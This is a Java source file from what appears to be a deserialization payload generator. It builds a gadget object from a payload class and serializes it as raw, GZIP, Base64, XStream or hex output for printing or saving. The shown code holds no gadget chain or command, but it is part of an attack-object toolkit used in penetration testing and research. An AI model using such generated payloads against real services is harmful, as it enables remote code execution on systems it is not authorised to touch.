package com.ppp;


import com.ppp.enums.Save;
import com.ppp.sinks.SinksHelper;
import com.ppp.utils.Serializer;

import java.io.FileOutputStream;
import java.io.PrintStream;

/**
 * @author Whoopsunix
 */
public class ObjectPayloadBuilder {

    public static Object builder(Class<? extends ObjectPayload> cls, SinksHelper sinksHelper) throws Exception {
        // 生成 Gadget
        ObjectPayload payload = cls.newInstance();
        Object gadget = payload.getObject(sinksHelper);

        // 输出
        PrintStream out = System.out;
        String output = sinksHelper.getOutput();
        Object result = null;

        if (output == null) {
            Serializer.serialize(gadget, out);
        } else if (output.equalsIgnoreCase(String.valueOf(Save.GZIP))) {
            Serializer.serializeGZip(gadget, out);
        } else if (output.equalsIgnoreCase(String.valueOf(Save.Base64))) {
            result = Serializer.serializeBase64(gadget);
        } else if (output.equalsIgnoreCase(String.valueOf(Save.Base64gzip))) {
            result = Serializer.serializeBase64GZip(gadget);
        } else if (output.equalsIgnoreCase(String.valueOf(Save.XStream))) {
            result = Serializer.serializeXStream(gadget);
        } else if (output.equalsIgnoreCase(String.valueOf(Save.hexAscii))) {
            result = Serializer.serializeHexAscii(gadget);
        } else {
            Printer.warn("No corresponding output type found, check the output [-o] parameter");
            Serializer.serialize(gadget, out);
        }

        Printer.blueInfo("byte length: " + Serializer.serialize(gadget).length);
        System.out.println(result);

        // 保存文件
        if (sinksHelper.isSave()) {
            if (result != null) {
                // 保存
                FileOutputStream fos = new FileOutputStream(sinksHelper.getSavePath());
                fos.write(result.toString().getBytes());
                fos.close();
            }else if (output == null || !output.equalsIgnoreCase(String.valueOf(Save.GZIP))) {
                Serializer.serialize(gadget, new PrintStream(sinksHelper.getSavePath()));
            } else {
                Serializer.serializeGZip(gadget, new PrintStream(sinksHelper.getSavePath()));
            }
        }

        return gadget;
    }

}
